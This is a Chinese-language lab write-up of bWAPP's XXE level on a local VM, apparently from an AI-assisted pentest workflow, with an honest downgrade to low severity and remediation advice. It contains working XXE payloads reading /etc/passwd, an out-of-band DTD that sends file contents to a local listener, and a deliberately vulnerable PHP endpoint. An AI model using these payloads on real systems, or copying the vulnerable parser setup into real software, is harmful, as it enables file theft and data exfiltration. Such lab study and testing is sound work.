# 漏洞笔记：bWAPP 原生 XXE 关卡（xxe-2.php）——实体展开确认 + 外部实体实测被运行时阻断

- **编号**：B2-XXE-01（Loop 3 B 档，t4）
- **靶场**：Kali VM `dc1` 内 bWAPP，`http://192.168.56.101/bWAPP/`（宿主侧）/ `http://127.0.0.1/bWAPP/`（VM 内）
- **应用**：bWAPP（buggy Web Application），`/var/www/html/bWAPP`，**原有安装**（目录 mtime Oct 11 00:01，非本任务部署）
- **落点定性**：**bWAPP 原生关卡**（`/var/www/html/bWAPP/xxe-1.php` 前端 + `xxe-2.php` 服务端解析）。**不是自建靶点**
- **安全级别**：bWAPP `security_level` cookie `0`(low) / `1`(medium) / `2`(high) 三级全部实测
- **危害等级**：**Low（低危）** —— **2026-10-12 由 Medium 下调**（verifier t10 独立复核、队长采纳）。**可利用性实测为零**，唯一实测影响是 low 档 `display_errors` 回显 PHP Warning 连绝对路径（信息泄露）。定级依据见 §1.2
- **CWE/OWASP**：CWE-611（Improper Restriction of XML External Entity Reference）；OWASP Top 10 2021 **A05:2021 Security Misconfiguration**
- **复现率**：内部实体展开 **≥95%**（5/5 成功）；外部 SYSTEM 实体**未展开**（low 3/3、medium 3/3 均为空）；OOB/远程 DTD **0 命中**
- **测试时间**：2026-10-12 21:57–22:16（Asia/Shanghai）

---

## 1. 漏洞概述与等级

**危害等级：Low（低危）。**

一句话立场：**这是一个"有 XXE 关卡、但 XXE 打不穿"的配置型问题，不是可利用漏洞。** 只报解析器可达性 = 把可达性当危害，这在报告里会被打回。

- **落点**：`/var/www/html/bWAPP/xxe-1.php`（前端）+ `xxe-2.php`（服务端 `simplexml_load_string`）
- **档位**：low / medium / high 三级全部实测，结论一致

### 1.2 定级依据：为什么是 Low（**不得主张 High / Critical**）

**2026-10-12 由 Medium 下调为 Low**，依据是 verifier（t10）的独立复核，队长已采纳。

| 定级维度 | 实测结果 | 出处 |
|---|---|---|
| **CWE-611 核心危害（读文件）** | **不可达，6/6** | t4 实测 low 3/3 + medium 3/3 全空；verifier `verified-loop3-b-b2-xxe-raw-20261012-2236.json` 复核一致 |
| **SSRF / OOB 外带** | **6 次尝试，0 命中** | t4 `loop3-t4-probe9.json` + verifier `verified-loop3-b-b2-rootcause-20261012-2236.json` |
| **低档 DB 实际写入值** | 外部实体 payload 写入 `secret_after = "AABB"` —— **正是解析器对未展开外部实体的占位输出**，不含任何文件内容 | verifier `verified-loop3-b-b2-rootcause-20261012-2236.json` → `low_cases[lowC4-SYSTEM-passwd]` |
| **CVSS 影响项** | **全 N（无实质影响）** | 无机密性/完整性/可用性损失 |

**唯一实测到的影响**：low 档 `display_errors` 把 PHP Warning 连**绝对路径**一起回显（`/var/www/html/bWAPP/xxe-2.php on line 32`），属**错误信息泄露**。medium/high 档连这条都没有（`display_errors` 未开）。**这才是本条定为 Low 的全部理由** —— 是信息泄露，不是文件读取，不是 RCE，不是 SSRF。

> **口径纪律**：**"解析器接受实体输入"是可达性，不是危害。** 把可达性当危害报出去，会被 verifier 直接打回。本篇如实写：**有 XXE 关卡 ≠ XXE 可利用**。

### 1.3 原理（源码级根因）

`xxe-2.php` 把请求体**原样**交给 `simplexml_load_string()`，且**没有**传 `LIBXML_NOENT`：

```php
$body = file_get_contents("php://input");
if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
{
    ini_set("display_errors",1);
    $xml = simplexml_load_string($body);     // ← 无 LIBXML_NOENT
    $login = $xml->login;
    $secret = $xml->secret;
    if($login && $login != "" && $secret)
    {
        $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'";
```

**两条独立的缓解恰好同时生效**，才使外部实体没被打通：

1. **PHP 8 起 libxml 默认不展开 `SYSTEM` 外部实体**（除非显式 `LIBXML_NOENT`）
2. **PHP 8 起 `libxml_disable_entity_loader()` 已废弃**，关卡里那行被注释掉的 `libxml_disable_entity_loader(true)`（`xxe-2.php:78`）**在语义上已无作用**

即：**关卡作者本意是"故意开着外部实体"，但运行时默认行为把它堵了。** 这是"有 XXE 关卡 ≠ XXE 可利用"的教科书反例。

### 1.2 关卡真实源码（只读摘录）

`/var/www/html/bWAPP/xxe-2.php`：

```php
$body = file_get_contents("php://input");

// If the security level is not MEDIUM or HIGH
if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
{
    ini_set("display_errors",1);
    $xml = simplexml_load_string($body);
    $login = $xml->login;
    $secret = $xml->secret;
    if($login && $login != "" && $secret)
    {
        $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'";
        ...
    }
}
else
{
    // Disables XML external entities. Doesn't work with older PHP versions!
    // libxml_disable_entity_loader(true);
    $xml = simplexml_load_string($body);
    $login = $_SESSION["login"];        // ← 中/高级忽略 XML 里的 <login>
    $secret = $xml->secret;
    ...
}
```

`xxe-1.php` 前端用 `XMLHttpRequest` 以 `Content-Type: text/xml; charset=UTF-8` POST 到 `xxe-2.php`：

```js
xmlHttp.open("POST","xxe-2.php",true);
xmlHttp.setRequestHeader("Content-type","text/xml; charset=UTF-8");
xmlHttp.send("<reset><login>...</login><secret>Any bugs?</secret></reset>");
```

**注意**：`libxml_disable_entity_loader(true)` 这一行在源码里是**注释掉的**（`xxe-2.php:78`），说明关卡作者本意就是"不关外部实体"。

---

## 2. 复现步骤与证据

### 2.1 复现步骤（Kali 内 `127.0.0.1/bWAPP/`）

| 步骤 | 动作 | 实测结果 |
|---|---|---|
| 1 | `php -v` / `php -i` 取运行时 | **PHP 8.4.24** + libxml **2.15.3** |
| 2 | low 档送**内部实体** payload（5 轮） | ✅ 回显 `LO3-INTERNAL-CANARY-9911`（**成立**） |
| 3 | low 档送 `SYSTEM "file:///etc/passwd"`（3 轮） | ❌ `An error occured!`，无 `root:x:0:0` |
| 4 | medium 档同 payload（3 轮） | ❌ 无 `root:x:0:0` |
| 5 | 三档送**远程 DTD / OOB** payload | ❌ 接收端 **`oob_new: 0`**（连 DTD 都没去取） |
| 6 | 三档送**实体放大** payload | ❌ 未展开，无膨胀 |
| 7 | **未定义实体**对照（`&nope;`） | 报错 → 证明解析器**确实在解析实体**，不是整体忽略输入 |
| 8 | **无 DOCTYPE** 对照 | 正常入库 → 证明差异来自 DOCTYPE/实体本身 |
| 9 | 教学靶点对照（显式 `LIBXML_NOENT`） | ✅ **明文读到** `root:x:0:0`（证明 payload 没写错） |
| 10 | 教学靶点拆除核验 | **404**，目录已删 |

**复现率**：内部实体 **5/5**（阳性）；外部实体 low **3/3** + medium **3/3** **未展开**（阴性）。区间表述 **≥95%**，**不写 100%**。

> ⚠️ **写端点纪律**：`UPDATE users SET secret` 是写端点。用**不存在的 login** 触发展开并读响应回显 → 影响 0 行。
> ⚠️ **例外必须如实记**：medium/high 分支**忽略 XML 里的 `<login>`、改用 `$_SESSION["login"]`** —— 走那条路径会真实写 bee 的 secret。**本轮踩到过，已复原并如实记录**，不藏。

### 2.2 原始证据（完整文件名 + sha256，**本轮独立重算**）

证据目录：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\`

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `loop3-t4-probe2.json` | 决定性判定：内部实体回显 / `file://` 空 / 未定义实体报错 / 无 DOCTYPE 对照 | `ec21d03d66b844e4d8cee1032d56d5b3b240e1bf7206c7128095c7b85c738707` |
| `loop3-t4-probe9.json` | 远程 DTD OOB（**0 命中**）+ 版本 + 渲染对照 | `9bc4e52fef99c42a3a3a4779d99cb7d1dae488b86db0c5d08f10131459758ac3` |
| `loop3-t4-probe9-sink.jsonl` | 原生关卡 OOB 探测期间接收端记录（**无 xxe 相关命中**） | `e79192488491278d08d06bb724a8631f3f0c164286eceba2c4edb3971548b18e` |
| `loop3-t4-probe11.json` | 解析器矩阵 + 教学靶点部署/源码/**删除核验** | `108924d1bc00972b39b6a09ddb4b7e31ab16998231b1706fc2902998a107afe6` |
| `loop3-t4-probe11-sink.jsonl` | 教学靶点远程 DTD 的接收端原始请求（**1 命中**） | `12fdb00bf5f802cade9643f040a16d01b68665a753dfaf6230481b8d47e5b3ad` |
| `loop3-t4-probe13.json` | 复现率：内部实体 5/5、外部实体 low 3/3 + medium 3/3 未展开 | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` |
| `loop3-b0-recon4-out.txt` | `xxe-1.php` / `xxe-2.php` 源码全文 | `fc55d98a9d638c822e5d144972ccad88b8de8d52e02fa4c6f05418a768a6dad6` |

**引用存在性自检**：上述 7 个文件全部存在，**missing = 0**（见 §9）。

---

## 3. 可复现 payload

> 写端点纪律：打进 `<login>` 的实体展开后会出现在响应回显里，用**不存在的 login** 可让 `UPDATE ... WHERE login='...'` 影响 0 行 → **零写入取证**。

### 3.1 内部实体（确认解析器会展开实体）

```http
POST /bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<bee 会话>; security_level=0
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "loop3canary">]>
<reset><login>&hello;_nosuchuser</login><secret>x</secret></reset>
```

实测响应（200）：

```
loop3canary_nosuchuser's secret has been reset!
```

→ 实体被展开，且展开值回显。

### 3.2 外部 SYSTEM 实体（本轮**未展开**）

```http
POST /bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<bee 会话>; security_level=0
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset><login>&xxe;</login><secret>x</secret></reset>
```

实测响应（200）：`An error occured!` —— 未出现任何 `/etc/passwd` 内容。

### 3.3 未定义实体对照（证明是"解析失败"而非"静默成功"）

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "loop3canary">]>
<reset><login>&undefined_loop3;</login><secret>x</secret></reset>
```

low 级实测响应（200）：PHP Warning 原文——

```
<b>Warning</b>: simplexml_load_string(): Entity: line 2: parser error : Entity 'undefined_loop3' not defined in <b>/var/www/html/bWAPP/xxe-2.php</b> on line <b>32</b>
```

medium 级同形态：`An error occured!`（`display_errors` 未开）。→ 解析确实报错，我的探测能区分"实体未定义"与"实体展开为空"。

---

## 4. 根因：为什么外部实体拿不到内容（本环境实测）

本机 PHP CLI 与 bWAPP 同一运行时，对照矩阵（`loop3-t4-probe11.json` → `A_parser_matrix`）：

| 调用方式 | 实测结果 |
|---|---|
| `simplexml_load_string` + 内部实体 | `a=INT-CANARY-7788`（展开 ✅） |
| `simplexml_load_string` + `SYSTEM file:///etc/passwd`，**无 flag** | `len=0`（**空** ❌） |
| `simplexml_load_string` + 同上，**加 `LIBXML_NOENT`** | `len=3256 a=root:x:0:0:root:/ro`（展开 ✅） |
| `DOMDocument::loadXML` + `SYSTEM`，**无 flag** | `len=0` ❌ |
| `DOMDocument::loadXML` + `SYSTEM` + `LIBXML_NOENT\|LIBXML_DTDLOAD` | `len=6512 a=root:x:0:0:root:/ro` ✅ |
| `DOMDocument::loadXML` + `SYSTEM` + `LIBXML_NOENT\|LIBXML_NONET` | `len=6512 a=root:x:0:0:root:/ro` ✅（`NONET` 只挡网络，不挡 `file://`） |

环境事实：`PHP 8.4.24 (NTS)`、`libxml 2.15.3`（compiled `21503`）。

**结论（本轮立场明确）**：bWAPP `xxe-2.php` 调 `simplexml_load_string($body)` **未传 `LIBXML_NOENT`**，而 PHP 8.4 + libxml 2.15 的默认行为**不展开 SYSTEM 外部实体**（只展开内部实体）。因此：

- 关卡原意是 XXE 练习点，**但当前运行时把外部实体这一条路径堵死了**；
- 我要给"禁用外部实体后的对照"这个要求，最好的对照就是**同环境下的 `LIBXML_NOENT` 开/关**，见下表；
- **不能**把"内部实体能展开"包装成"XXE 读取了文件"——那是两个不同的事实，报告里严格分开写。

### 禁用外部实体后的对照（教学靶点，见 §5）

| 端点 | 解析调用 | 内部实体 | `SYSTEM file:///etc/passwd` |
|---|---|---|---|
| `/lo3-teach/noent.php` | `loadXML($body, LIBXML_NOENT\|LIBXML_DTDLOAD)` | 展开 `LO3-INTERNAL-CANARY-9911` | **返回完整 `/etc/passwd`（`root:x:0:0...`）** |
| `/lo3-teach/noflag.php` | `loadXML($body)`（不传 flag） | 展开同上 | **返回空（`LO3_TEACH_NOENT=0 ` 后无内容）** |
| bWAPP 原生 `xxe-2.php` | `simplexml_load_string($body)`（不传 flag） | 展开 `loop3canary` | **空 → 响应 `An error occured!`** |

---

## 5. ⚠ 自建教学靶点归档（**不计入 bWAPP/DVWA 漏洞数**）

**定性纪律**：`/var/www/html/lo3-teach/*` 是**我们构造的教学靶点（SELF-BUILT / TEACHING ONLY）**，**不是** bWAPP 或 DVWA 的漏洞。**不得计入任何应用的漏洞计数，也不得写成"发现型漏洞"。**

- **部署位置**：`/var/www/html/lo3-teach/`（由 `loop3-t4-probe11.py` 写入）
- **源码**（完整留档，见 `loop3-t4-probe11.json` → `B_endpoint_source_noent` / `B_endpoint_source_noflag`）：

```php
<?php
// ===== loop3 t4 B2 自建教学靶点（SELF-BUILT / TEACHING ONLY）=====
// 部署：由 security/learning/_evidence/loop3-t4-probe11.py 写入 /var/www/html/lo3-teach
// 删除：sudo -n rm -rf /var/www/html/lo3-teach
$body = file_get_contents("php://input");
if ($body === "") { http_response_code(400); echo "no body"; exit; }
$doc = new DOMDocument();
$ok = $doc->loadXML($body, LIBXML_NOENT | LIBXML_DTDLOAD);   // ← 故意打开外部实体
echo "LO3_TEACH_NOENT=1\n";
echo $doc->textContent;
```

对照端点 `noflag.php` 唯一差别是 `loadXML($body)` **不传 flag**。

- **部署命令**（留档）：`sudo -n cp /tmp/lo3_noent.php <dir>/noent.php && sudo -n cp /tmp/lo3_noflag.php <dir>/noflag.php && sudo -n cp /tmp/lo3_evil.dtd <dir>/evil.dtd`
- **本地 DTD**（`<dir>/evil.dtd`，用于两段式 OOB）：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'http://127.0.0.1:8099/LO3DTD-%file;'>">
%eval;
%err;
```

- **恢复/删除方法**（已执行）：`sudo -n rm -rf /var/www/html/lo3-teach`
- **删除后核验**：`GET /lo3-teach/noent.php` → **404**；`ls -la /var/www/html/` 已无 `lo3-teach` 目录（见 `loop3-t4-probe11.json` → `C_verify_removed` / `C_docroot`，与 `loop3-t4-probe12.json` → `final_teaching_endpoint: 404`）

教学靶点实测结果：

| 用例 | 结果 |
|---|---|
| 内部实体回显 | `LO3_TEACH_NOENT=1 LO3-INTERNAL-CANARY-9911...` ✅ |
| `SYSTEM file:///etc/passwd`（NOENT 开） | `root:x:0:0:root:/root:/usr/bin/zsh ...` ✅ 明文读取 |
| 同上（不传 flag 对照端点） | `LO3_TEACH_NOENT=0 ` 后**无内容** ❌ |
| 本地 DTD `file:///tmp/lo3_evil.dtd` 加载 | 200，无外带（本地 DTD 里的 `%err;` 指向 http，未触发） |
| 远程 DTD `http://127.0.0.1:8099/lo3dtd-remote.dtd` | **接收端 1 命中**（`GET /lo3dtd-remote.dtd`）→ 外部 DTD 加载**确实发生** |

> OOB 语义澄清：远程 DTD 被加载（接收端命中）但 DTD 内部那条 `%file;` 读取 `/etc/passwd` 的链路未把文件内容带出来，故**没有形成完整数据外带**。bWAPP 原生关卡在 low/medium/high 三档 **0 命中**，即连 DTD 都没去取。

---

## 6. 修复方案

对 bWAPP 这类练习关卡本身无需修复（它就是故意有洞的），但**把同一模式移植到真实应用**时：

1. **解析前显式禁用**：PHP 8 起 `libxml_disable_entity_loader()` 已废弃（本机 `function_exists` 仍为 true 但语义变化），正确做法是 **不要传 `LIBXML_NOENT`**、并对 `DOMDocument` 使用 `LIBXML_NONET`；最关键的是**不要给外部实体展开的能力**（本次实测不加 flag 即天然安全）。
2. **输入侧**：`libxml_set_external_entity_loader(fn() => null)`；或改用不接受 DTD 的解析路径。
3. **业务侧**：接收 XML 前校验 `Content-Type` 与结构，拒绝含 `<!DOCTYPE`/`<!ENTITY` 的请求体。
4. **出口侧**：出站白名单 + 禁 `file://` 协议处理（真正防 SSRF/文件读取）。
5. **`display_errors=Off`**：本次 low 级把 PHP Warning 连**绝对路径**一起回显（`/var/www/html/bWAPP/xxe-2.php on line 32`），属额外信息泄露，生产必须关闭。
6. **权限**：XML 解析进程不应有读 `/etc/passwd`、私钥、`.env` 的权限。

---

## 7. 学习要点

- **"有 XXE 关卡" ≠ "XXE 可利用"**。必须先测解析器是否展开 SYSTEM 实体；内部实体能展开**不能**推断外部实体也能。本次就是典型反例。
- **要看运行时，不看关卡注释**。`xxe-2.php:78` 那行 `libxml_disable_entity_loader(true)` 被注释掉，看着像"故意开着"，但 PHP 8.4 的默认行为已经把它堵了。
- **零写入取证**：写端点（`UPDATE users SET secret`）用**不存在的 login** 触发实体展开并读取响应回显，`UPDATE` 影响 0 行。但要注意 medium/high 分支**忽略 XML 里的 `<login>`、改用 `$_SESSION["login"]`**，那条路径会真实写 bee 的 secret（本任务踩到过，已复原并如实记录）。
- **自建靶点必须标注**：教学端点的漏洞不是被测应用的漏洞，计数、归档、命名都要显式区分，且测试后立即拆除并核验 404。

---

## 8. 参考链接

- bWAPP XXE 关卡源码：`/var/www/html/bWAPP/xxe-1.php`、`/var/www/html/bWAPP/xxe-2.php`（只读取证，完整输出见 `loop3-b0-recon4-out.txt`）
- **CWE-611** — Improper Restriction of XML External Entity Reference：https://cwe.mitre.org/data/definitions/611.html
- **CWE-776** — Improper Restriction of Recursive Entity References（实体放大/ Billion Laughs）：https://cwe.mitre.org/data/definitions/776.html
- **CWE-295** — Improper Certificate Validation（DTD 走 HTTP 时的隐含信任问题）：https://cwe.mitre.org/data/definitions/295.html
- PHP `LIBXML_NOENT` 等 libxml 常量：https://www.php.net/manual/en/libxml.constants.php
- PHP `libxml_disable_entity_loader()`（PHP 8 起废弃）：https://www.php.net/manual/en/function.libxml-disable-entity-loader.php
- `simplexml_load_string` 参考：https://www.php.net/manual/en/function.simplexml-load-string.php
- bWAPP 官方站点：http://www.itsecgames.com/
- OWASP XXE Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

---

## 9. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @('loop3-t4-probe2.json','loop3-t4-probe9.json','loop3-t4-probe11.json',
          'loop3-t4-probe11-sink.jsonl','loop3-t4-probe13.json',
          'loop3-b0-recon4-out.txt','loop3-t4-probe9-sink.jsonl')
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath "$root\security\learning\_evidence\$_") })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=7  missing=0`
